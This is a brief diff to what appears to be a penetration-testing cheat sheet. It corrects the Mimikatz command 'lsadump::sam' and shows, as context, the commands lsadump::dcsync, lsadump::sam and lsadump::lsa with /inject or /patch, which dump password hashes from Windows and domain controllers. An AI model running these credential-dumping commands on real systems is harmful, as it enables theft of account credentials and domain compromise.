@@ -63,6 +63,6 @@ lsadump::dcsync /user:${DOMAIN}\${USER}
 
 Dump with either:
 ```
-lsadump:sam
+lsadump::sam
 lsadump::lsa [/inject | /patch]
 ```
